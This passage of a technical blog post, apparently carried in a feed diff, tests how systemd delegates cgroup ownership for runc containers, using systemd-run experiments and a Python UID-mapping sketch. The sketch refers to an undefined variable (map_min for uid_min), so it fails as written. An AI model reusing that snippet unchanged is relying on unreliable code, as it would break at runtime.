-properties are <code>User=</code> and <code>Group=</code>:</p>
-<blockquote>
-<p>Set the UNIX user or group that the processes are executed as,
-respectively. Takes a single user or group name, or a numeric ID
-as argument.</p>
-</blockquote>
-<p>This sounds promising. Further searching turned up a systemd
-documentation page entitled <a href="https://systemd.io/CGROUP_DELEGATION/">Control Group APIs and
-Delegation</a>. That document states:</p>
-<blockquote>
-<p>By turning on the <code>Delegate=</code> property for a scope or service you
-get a few guarantees: … If your service makes use of the <code>User=</code>
-functionality, then the sub-tree will be <code>chown()</code>ed to the
-indicated user so that it can correctly create cgroups below it.</p>
-</blockquote>
-<p><code>runc</code> already supplies <code>Delegate=true</code>. The <code>User=</code> property seems
-to be exactly what we need.</p>
-<h2 id="determining-the-uid">Determining the UID <a href="#determining-the-uid" class="section">§</a></h2>
-<p>The OCI configuration specifies the <a href="https://github.com/opencontainers/runtime-spec/blob/master/config.md#posix-platform-user"><code>user</code></a> that will
-execute the container process (in the <strong>container’s user
-namespace</strong>). It also specifies <a href=""><code>uidMappings</code></a>
-between the host and container user namespaces. For example:</p>
-<pre class="shell"><code>% jq -c &#39;.process.user, .linux.uidMappings&#39; &lt; config.json
-{&quot;uid&quot;:0,&quot;gid&quot;:0}
-[{&quot;containerID&quot;:0,&quot;hostID&quot;:100000,&quot;size&quot;:65536}]</code></pre>
-<p><code>runc</code> has all the data it needs to compute the appropriate value
-for the <code>User=</code> property. The algorithm, expressed as Python is:</p>
-<div class="sourceCode" id="cb3"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>uid <span class="op">=</span> config[<span class="st">&quot;process&quot;</span>][<span class="st">&quot;user&quot;</span>][<span class="st">&quot;uid&quot;</span>]</span>
-<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> <span class="bu">map</span> <span class="kw">in</span> config[<span class="st">&quot;linux&quot;</span>][<span class="st">&quot;uidMappings&quot;</span>]:</span>
-<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>    uid_min <span class="op">=</span> <span class="bu">map</span>[<span class="st">&quot;containerID&quot;</span>]</span>
-<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>    uid_max <span class="op">=</span> map_min <span class="op">+</span> <span class="bu">map</span>[<span class="st">&quot;size&quot;</span>] <span class="op">-</span> <span class="dv">1</span></span>
-<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> uid_min <span class="op">&lt;=</span> uid <span class="op">&lt;=</span> uid_max:</span>
-<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a>        offset <span class="op">=</span> uid <span class="op">-</span> uid_min</span>
-<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="bu">map</span>[<span class="st">&quot;hostID&quot;</span>] <span class="op">+</span> offset</span>
-<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a><span class="cf">else</span>:</span>
-<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a>    <span class="cf">raise</span> <span class="pp">RuntimeError</span>(<span class="st">&quot;user.uid is not mapped&quot;</span>)</span></code></pre></div>
-<h2 id="testing-with-systemd-run">Testing with <code>systemd-run</code> <a href="#testing-with-systemd-run" class="section">§</a></h2>
-<p><code>systemd-run(1)</code> uses the transient unit API to run programs via
-transient scope or service units. You can use the <code>--property</code>/<code>-p</code>
-option to pass additional properties. I used <code>systemd-run</code> to
-observe how systemd handles the <code>Delegate=true</code> and <code>User=</code>
-properties.</p>
-<h3 id="create-and-inspect-transient-unit">Create and inspect transient unit <a href="#create-and-inspect-transient-unit" class="section">§</a></h3>
-<p>First I will do a basic test, talking to my user account’s service
-manager:</p>
-<pre class="shell"><code>% id -u
-1000
-
-% systemd-run --user sleep 300
-Running as unit: run-r8e3c22d2bb64491a85882d8303202dca.service
-
-% systemctl --user status run-r8e3c22d2bb64491a85882d8303202dca.service
-● run-r8e3c22d2bb64491a85882d8303202dca.service - /bin/sleep 300
-     Loaded: loaded (/run/user/1000/systemd/transient/run-r8e3c22d2bb64491a85882d8303202dca.service; transient)
-  Transient: yes
-     Active: active (running) since Wed 2021-06-09 11:31:14 AEST; 9s ago
-   Main PID: 11412 (sleep)
-      Tasks: 1 (limit: 2325)
-     Memory: 184.0K
-        CPU: 3ms
-     CGroup: /user.slice/user-1000.slice/user@1000.service/app.slice/run-r8e3c22d2bb64491a85882d8303202dca.service
-             └─11412 /bin/sleep 300
-
-Jun 09 11:31:14 f33-1.ipa.local systemd[863]: Started /bin/sleep 300.
-
-% ls -nld /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/app.slice/run-r8e3c22d2bb64491a85882d8303202dca.service
-drwxr-xr-x. 2 1000 1000 0 Jun  9 11:31 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/app.slice/run-r8e3c22d2bb64491a85882d8303202dca.service</code></pre>
-<p>We can see that:</p>
-<ul>
-<li>systemd-run creates the transient unit</li>
-<li>the unit was started successfully, and is running</li>
-<li>the unit has is own <code>CGroup</code></li>
-<li>the cgroup is owned by user <code>1000</code></li>
-</ul>
-<p>As I try different ways of invoking <code>systemd-run</code>, I will repeat
-this pattern of unit creation, inspection and cgroup ownership
-checks.</p>
-<h3 id="specify-user-user-service-manager">Specify <code>User=</code> (user service manager) <a href="#specify-user-user-service-manager" class="section">§</a></h3>
-<p>Next I explicity specify <code>User=1000</code>:</p>
-<pre class="shell"><code>% systemd-run --user -p User=1000 sleep 300
-Running as unit: run-r651ff7d0d1214037b70def6d5694dcd6.service
-
-% systemctl --no-pager --full --user status run-r651ff7d0d1214037b70def6d5694dcd6.service
-× run-r651ff7d0d1214037b70def6d5694dcd6.service - /bin/sleep 300
-     Loaded: loaded (/run/user/1000/systemd/transient/run-r651ff7d0d1214037b70def6d5694dcd6.service; transient)
-  Transient: yes
-     Active: failed (Result: exit-code) since Wed 2021-06-09 11:38:50 AEST; 1min 17s ago
-    Process: 11432 ExecStart=/bin/sleep 300 (code=exited, status=216/GROUP)
-   Main PID: 11432 (code=exited, status=216/GROUP)
-        CPU: 4ms
-
-Jun 09 11:38:50 f33-1.ipa.local systemd[863]: Started /bin/sleep 300.
-Jun 09 11:38:50 f33-1.ipa.local systemd[11432]: run-r651ff7d0d1214037b70def6d5694dcd6.service: Failed to determine supplementary groups: Operation not permitted
-Jun 09 11:38:50 f33-1.ipa.local systemd[11432]: run-r651ff7d0d1214037b70def6d5694dcd6.service: Failed at step GROUP spawning /bin/sleep: Operation not permitted
-Jun 09 11:38:50 f33-1.ipa.local systemd[863]: run-r651ff7d0d1214037b70def6d5694dcd6.service: Main process exited, code=exited, status=216/GROUP
-Jun 09 11:38:50 f33-1.ipa.local systemd[863]: run-r651ff7d0d1214037b70def6d5694dcd6.service: Failed with result &#39;exit-code&#39;.</code></pre>
-<p>This unit failed to execute, because the user service manager does
-not have permission to determine supplementary groups. Without
-going into too much detail, this is because the user systemd
-instance lacks the <code>CAP_SETGID</code> capability required by the
-<code>setgroups(2)</code> system call used by <code>initgroups(3)</code>.</p>
-<p>There doesn’t seem to be a way around this. For the rest of my
-testing I’ll talk to the system service manager. That’s okay,
-because <code>runc</code> on OpenShift also talks to the system service
-manager.</p>
-<h3 id="specify-user-system-service-manager">Specify <code>User=</code> (system service manager) <a href="#specify-user-system-service-manager" class="section">§</a></h3>
-<pre class="shell"><code>% sudo systemd-run -p User=1000 sleep 300
-Running as unit: run-r94725453119e4003af336d7294984085.service
-
-% systemctl status run-r94725453119e4003af336d7294984085.service
-● run-r94725453119e4003af336d7294984085.service - /usr/bin/sleep 300
-     Loaded: loaded (/run/systemd/transient/run-r94725453119e4003af336d7294984085.service; transient)
-  Transient: yes
-     Active: active (running) since Wed 2021-06-09 11:50:10 AEST; 11s ago
-   Main PID: 11517 (sleep)
-      Tasks: 1 (limit: 2325)
-     Memory: 184.0K
-        CPU: 4ms
-     CGroup: /system.slice/run-r94725453119e4003af336d7294984085.service
-             └─11517 /usr/bin/sleep 300
-
-Jun 09 11:50:10 f33-1.ipa.local systemd[1]: Started /usr/bin/sleep 300.
-
-% ls -nld /sys/fs/cgroup/system.slice/run-r94725453119e4003af336d7294984085.service
-drwxr-xr-x. 2 0 0 0 Jun  9 11:50 /sys/fs/cgroup/system.slice/run-r94725453119e4003af336d7294984085.service
-
-% ps -o uid,pid,cmd --pid 11517
-  UID     PID CMD
- 1000   11517 /usr/bin/sleep 300</code></pre>
-<p>The process is running as user <code>1000</code>, but the cgroup is owned by
-<code>root</code>.</p>
-<h3 id="specify-delegatetrue">Specify <code>Delegate=true</code> <a href="#specify-delegatetrue" class="section">§</a></h3>
-<p>We need to specify <code>Delegate=true</code> to tell systemd to delegate the
-cgroup to the specified <code>User</code>:</p>
-<pre class="shell"><code>% sudo systemd-run -p Delegate=true -p User=1000 sleep 300
-Running as unit: run-r518dbc963502423c9c67b1c72d3d4c12.service
-
-% systemctl status run-r518dbc963502423c9c67b1c72d3d4c12.service
-● run-r518dbc963502423c9c67b1c72d3d4c12.service - /usr/bin/sleep 300
-     Loaded: loaded (/run/systemd/transient/run-r518dbc963502423c9c67b1c72d3d4c12.service; transient)
-  Transient: yes
-     Active: active (running) since Wed 2021-06-09 11:59:34 AEST; 1min 21s ago
-   Main PID: 11579 (sleep)
-      Tasks: 1 (limit: 2325)
-     Memory: 184.0K
-        CPU: 3ms
-     CGroup: /system.slice/run-r518dbc963502423c9c67b1c72d3d4c12.service
-             └─11579 /usr/bin/sleep 300
-
-Jun 09 11:59:34 f33-1.ipa.local systemd[1]: Started /usr/bin/sleep 300.
-
-% ls -nld /sys/fs/cgroup/system.slice/run-r518dbc963502423c9c67b1c72d3d4c12.service
-drwxr-xr-x. 2 1000 1000 0 Jun  9 11:59 /sys/fs/cgroup/system.slice/run-r518dbc963502423c9c67b1c72d3d4c12.service</code></pre>
-<p>systemd <code>chown()</code>ed the cgroup to the specified <code>User</code>. Note that
-very few of the cgroup controls in the cgroup directory are
-writable by user <code>1000</code>:</p>
-<pre class="shell"><code>% ls -nl /sys/fs/cgroup/system.slice/run-r518dbc963502423c9c67b1c72d3d4c12.service \
-    |grep 1000 
--rw-r--r--. 1 1000 1000 0 Jun  9 11:59 cgroup.procs
--rw-r--r--. 1 1000 1000 0 Jun  9 11:59 cgroup.subtree_control
--rw-r--r--. 1 1000 1000 0 Jun  9 11:59 cgroup.threads</code></pre>
-<p>So the process cannot adjust its root cgroup’s <code>memory.max</code>,
-<code>pids.max</code>, <code>cpu.weight</code> and so on. It <em>can</em> create cgroup
-subtrees, manage resources within them, and move processes and
-threads among those subtrees and its root cgroup.</p>
-<h3 id="arbitrary-uids">Arbitrary UIDs <a href="#arbitrary-uids" class="section">§</a></h3>
-<p>So far I have specified <code>User=1000</code>. User <code>1000</code> is a “known user”.
-That is, the Name Service Switch (see <code>nss(5)</code>) returns information
-about the user (name, home directory, shell, etc):</p>
-<pre class="shell"><code>% getent passwd $(id -u)
-ftweedal:x:1000:1000:ftweedal:/home/ftweedal:/bin/zsh</code></pre>
-<p>However, when executing containers with user namespaces, we usually
-map the namespace UIDs to unprivileged host UIDs from a <em>subordinate
-ID</em> range. Subordinate UIDs and GID ranges are currently defined in
-<code>/etc/subuid</code> and <code>/etc/subgid</code> respectively. The subuid range for
-user <code>1000</code> is:</p>
-<pre class="shell"><code>% grep $(id -un) /etc/subuid
-ftweedal:100000:65536</code></pre>
-<p>User <code>1000</code> has been allocated the range <code>100000</code>–<code>165535</code>. So
-let’s try <code>systemd-run</code> with <code>User=100000</code>:</p>
-<pre class="shell"><code>% sudo systemd-run -p Delegate=true -p User=100000 sleep 300
-Running as unit: run-r1498304af7df406c9698da5c683ea79e.service
-
-% systemctl --no-pager --full status run-r1498304af7df406c9698da5c683ea79e.service
-× run-r1498304af7df406c9698da5c683ea79e.service - /usr/bin/sleep 300
-     Loaded: loaded (/run/systemd/transient/run-r1498304af7df406c9698da5c683ea79e.service; transient)
-  Transient: yes
-     Active: failed (Result: exit-code) since Wed 2021-06-09 12:32:43 AEST; 14s ago
-    Process: 11766 ExecStart=/usr/bin/sleep 300 (code=exited, status=217/USER)
-   Main PID: 11766 (code=exited, status=217/USER)
-        CPU: 2ms
-
-Jun 09 12:32:43 f33-1.ipa.local systemd[1]: Started /usr/bin/sleep 300.
-Jun 09 12:32:43 f33-1.ipa.local systemd[11766]: run-r1498304af7df406c9698da5c683ea79e.service: Failed to determine user credentials: No such process
-Jun 09 12:32:43 f33-1.ipa.local systemd[11766]: run-r1498304af7df406c9698da5c683ea79e.service: Failed at step USER spawning /usr/bin/sleep: No such process
-Jun 09 12:32:43 f33-1.ipa.local systemd[1]: run-r1498304af7df406c9698da5c683ea79e.service: Main process exited, code=exited, status=217/USER
-Jun 09 12:32:43 f33-1.ipa.local systemd[1]: run-r1498304af7df406c9698da5c683ea79e.service: Failed with result &#39;exit-code&#39;.</code></pre>
-<p>It failed. Cutting the noise, the cause is:</p>
-<pre><code>Failed to determine user credentials: No such process</code></pre>
-<p>The string <code>No such process</code> is a bit misleading. It is the string
-associated with the <code>ESRCH</code> error value (see <code>errno(3)</code>). Here it
-indicates that <code>getpwuid(3)</code> did not find a user record for uid
-<code>100000</code>. systemd unconditionally fails in this scenario. And this
-is a problem for us because without intervention, subordinate UIDs
-do not have associated user records.</p>
-<h3 id="arbitrary-uids-with-passwd-entry">Arbitrary UIDs (with <code>passwd</code> entry) <a href="#arbitrary-uids-with-passwd-entry" class="section">§</a></h3>
-<p>So let’s make NSS return something for user <code>100000</code>. There are
-several ways we could do this, including adding it to <code>/etc/passwd</code>,
-or creating an NSS module that generates passwd records for ranges
-declared in <code>/etc/subuid</code>.</p>
-<p>Another way is to use <a href="https://www.freedesktop.org/software/systemd/man/nss-systemd.html">systemd’s NSS module</a>, which
-returns passwd records for containers created by
-<a href="https://www.freedesktop.org/software/systemd/man/systemd-machined.html"><code>systemd-machined</code></a>. And that’s what I did.
-Given the root filesystem for a container in <code>./rootfs</code>,
-<a href="https://www.freedesktop.org/software/systemd/man/systemd-nspawn.html"><code>systemd-nspawn</code></a> creates the container. The
-<code>--private-users=100000</code> option tells it to create a user namespace
-mapping to the host UID <code>100000</code> with default size 65536:</p>
-<pre class="shell"><code>% sudo systemd-nspawn --directory rootfs --private-users=100000 /bin/sh
-Spawning container rootfs on /home/ftweedal/go/src/github.com/opencontainers/runc/rootfs.
-Press ^] three times within 1s to kill container.
-Selected user namespace base 100000 and range 65536.
-sh-5.0#</code></pre>
-<p>On the host we can see the “machine” via
-<a href="https://www.freedesktop.org/software/systemd/man/machinectl.html"><code>machinectl(1)</code></a>. We also observe that NSS now returns
-results for UIDs in the mapped host range.</p>
-<pre class="shell"><code>% getent passwd 100000 165535  
-vu-rootfs-0:x:100000:65534:UID 0 of Container rootfs:/:/usr/sbin/nologin
-
-% getent passwd 100000 165534
-vu-rootfs-0:x:100000:65534:UID 0 of Container rootfs:/:/usr/sbin/nologin
-vu-rootfs-65534:x:165534:65534:UID 65534 of Container rootfs:/:/usr/sbin/nologin</code></pre>
-<p>The <code>passwd</code> records are constructed on demand by
-<a href="https://www.freedesktop.org/software/systemd/man/nss-systemd.html"><code>nss-systemd(8)</code></a> using data registered by
-<code>systemd-machined</code>.</p>
-<p>Now let’s try <code>systemd-run</code> again:</p>
-<pre class="shell"><code>% sudo systemd-run -p Delegate=true -p User=100000 sleep 300
-Running as unit: run-r076a82c36fcd4934b13bba47fcc8462e.service
-
-% systemctl status run-r076a82c36fcd4934b13bba47fcc8462e.service
-● run-r076a82c36fcd4934b13bba47fcc8462e.service - /usr/bin/sleep 300
-     Loaded: loaded (/run/systemd/transient/run-r076a82c36fcd4934b13bba47fcc8462e.service; transient)
-  Transient: yes
-     Active: active (running) since Wed 2021-06-09 14:14:34 AEST; 11s ago
-   Main PID: 12045 (sleep)
-      Tasks: 1 (limit: 2325)
-     Memory: 180.0K
-        CPU: 4ms
-     CGroup: /system.slice/run-r076a82c36fcd4934b13bba47fcc8462e.service
-             └─12045 /usr/bin/sleep 300
-
-Jun 09 14:14:34 f33-1.ipa.local systemd[1]: Started /usr/bin/sleep 300.
-
-% ls -nld /sys/fs/cgroup/system.slice/run-r076a82c36fcd4934b13bba47fcc8462e.service 
-drwxr-xr-x. 2 100000 65534 0 Jun  9 14:14 /sys/fs/cgroup/system.slice/run-r076a82c36fcd4934b13bba47fcc8462e.service
-
-% ps -o uid,gid,pid,cmd --pid 12045
-  UID   GID     PID CMD
-  100000 65534  12045 /usr/bin/sleep 300
-
-% id -un 65534
-nobody</code></pre>
-<p>Now the cgroup is owned by <code>100000</code>. But the group ID (<code>gid</code>) under
-which the process runs, and the group owner of the cgroup, is
-<code>65534</code>. This is the host’s <code>nobody</code> account.</p>
-<h3 id="specify-group">Specify <code>Group=</code> <a href="#specify-group" class="section">§</a></h3>
-<p>In a user-namespaced container, ordinarily you would want both the
-user <em>and</em> the group of the container process to be mapped into the
-user namespace. Likewise, you would expect the cgroup to be owned
-by a known (in the namespace) user. Setting the <code>Group=</code> property
-should achieve this.</p>
-<pre class="shell"><code>% sudo systemd-run -p Delegate=true -p User=100000 -p Group=100000 sleep 300      
-Running as unit: run-re610d14cc0584a37a3d4099268df75d8.service
-
-% systemctl status run-re610d14cc0584a37a3d4099268df75d8.service
-● run-re610d14cc0584a37a3d4099268df75d8.service - /usr/bin/sleep 300
-     Loaded: loaded (/run/systemd/transient/run-re610d14cc0584a37a3d4099268df75d8.service; transient)
-  Transient: yes
-     Active: active (running) since Wed 2021-06-09 14:24:58 AEST; 7s ago
-   Main PID: 12131 (sleep)
-      Tasks: 1 (limit: 2325)
-     Memory: 184.0K
-        CPU: 5ms
-     CGroup: /system.slice/run-re610d14cc0584a37a3d4099268df75d8.service
-             └─12131 /usr/bin/sleep 300
-
-Jun 09 14:24:58 f33-1.ipa.local systemd[1]: Started /usr/bin/sleep 300.
-
-% ls -nld /sys/fs/cgroup/system.slice/run-re610d14cc0584a37a3d4099268df75d8.service
-drwxr-xr-x. 2 100000 100000 0 Jun  9 14:24 /sys/fs/cgroup/system.slice/run-re610d14cc0584a37a3d4099268df75d8.service
-
-% ps -o uid,gid,pid,cmd --pid 12131
-  UID   GID     PID CMD
-100000 100000 12131 /usr/bin/sleep 300</code></pre>
-<p>Finally, systemd is exhibiting the behaviour we desire.</p>
-<h2 id="discussion-and-next-steps">Discussion and next steps <a href="#discussion-and-next-steps" class="section">§</a></h2>
-<p>In summary, the findings from this investigation are:</p>
-<ul>
-<li><p>systemd changes the cgroup ownership of transient units according
-to the <code>User=</code> and <code>Group=</code> properties, if and only if
-<code>Delegate=true</code>.</p></li>
-<li><p>systemd currently requires <code>User=</code> and <code>Group=</code> to refer to known
-(via NSS) users and groups.</p></li>
-<li><p>Unprivileged user systemd service manager instances lack the
-privileges to set supplementary groups for the container process.
-This is not a problem for the OpenShift use case, because it uses
-the system service manager.</p></li>
-</ul>
-<p>As to the second point, I am curious why systemd behaves this way.
-It does makes sense to query NSS to find out the shell, home
-directory, and login name for setting up the execution environment.
-But if there is no <code>passwd</code> record, why not synthesise one with
-conservative defaults? Running processes as anonymous UIDs has a
-valid use case—increasingly so, as adoption of user namespaces
-increases. I <a href="https://github.com/systemd/systemd/issues/19781">filed an RFE (systemd#19781)</a> against
-systemd to suggest relaxing this restriction, and inquire whether
-this is a Bad Idea for some reason I don’t yet understand.</p>
-<p>There are some alternative approaches that don’t require changing
-systemd:</p>
-<ul>
-<li><p>Use <code>systemd-machined</code> to register a machine. It provides the
-<code>org.freedesktop.machine1.Manager.RegisterMachine</code> D-Bus method
-for this purpose. But <code>systemd-machined</code> is not used (or even
-present) on OpenShift cluster nodes.</p></li>
-<li><p>Implement, ship and configure an NSS module that synthesises
-<code>passwd</code> records for user subordinate ID ranges. The <em>shadow</em>
-project has <a href="https://github.com/shadow-maint/shadow/pull/321">defined an NSS interface</a> for subid
-ranges. <em>libsubid</em>, part of <em>shadow</em>, will provide abstract subid
-range lookups (forward and reverse). So a <em>libsubid</em>-based
-solution to this should be possible. Unfortunately, <em>libsubid</em> is
-not yet widely available as a shared library.</p>
-<p>As an example, synthetic user records could have a username like
-<code>subuid-{username}-{uid}</code>. The home directory and shell would be
-<code>/</code> and <code>/sbin/nologin</code>, like the records synthesised by
-<code>nss-systemd</code>.</p></li>
-<li><p>Update the container runtime (<code>runc</code>) to <code>chown</code> the cgroup <em>after
-systemd creates it</em>. In fact, this is what <code>systemd-nspawn</code> does.
-This approach is nice because the only component to change is
-<code>runc</code>—which had to change anyway, to add the logic to determine
-the cgroup owner UID. To the best of my knowledge, on OpenShift
-<code>runc</code> gets executed as <code>root</code> (on the node), so it should have
-the permissions required to do this. Unless SELinux prevents it.</p></li>
-</ul>
-<p>Of these three options, modifying <code>runc</code> to <code>chown</code> the cgroup
-directory seems the most promising. While I wait for feedback on
-<a href="https://github.com/systemd/systemd/issues/19781">systemd#19781</a>, I will start hacking on <code>runc</code> and testing my
-modifications.</p>]]></summary>
 </entry>
 
 </feed>
